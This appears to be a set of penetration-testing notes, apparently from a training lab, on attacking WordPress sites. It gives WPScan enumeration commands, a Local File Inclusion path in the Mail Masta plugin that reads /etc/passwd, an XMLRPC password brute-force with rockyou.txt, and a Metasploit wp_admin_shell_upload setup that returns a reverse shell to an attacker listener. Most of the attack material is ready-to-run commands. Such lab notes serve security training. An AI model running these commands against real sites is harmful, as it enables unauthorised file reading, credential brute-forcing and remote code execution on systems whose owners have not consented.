Automated #WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable.

---

Verify installation
```shell
wpscan --hh
```

--- 

###  [WPScan API](https://wpscan.com/)

Enumerate vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments `--enumerate ap`. Let's run a normal enumeration scan against a WordPress website.
```shell
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4f...
```

---

## Exploitation

After enumerating vulnerable plugins, select which to exploit. This example exploits Local File Inclusion (LFI) in the Mail Masta plugin.

Any unauthenticated user can read local files through the path:
`/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

This can be used to enumerate potential users to brute-force 

```shell
...
sally.jones:x:1001:1001:Linux User,,,:/home/sally.jones:/bin/bash
...
```

### XMLRPC Brute Force
After enumerating WP users we can use the following command to brute-force login:
```shell
wpscan --password-attack xmlrpc -t 20 -U roger -P rockyou.txt --url http://blog.inlanefreight.com
```

Gaining access to an admin account can then be leveraged to change a theme's `.php` file to Remote Code Execution or #RCE with [[PHP Shells]]

---

## Metasploit
Using #metasploit we can automate the WP exploitation process

To obtain the reverse shell, we can use the `wp_admin_shell_upload` module. We can easily search for it inside `MSF`:
```shell
msfconsole
...
msf5 > search wp_admin
...
msf5 > use 0
```

```shell-session
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options
...
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts target.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
```

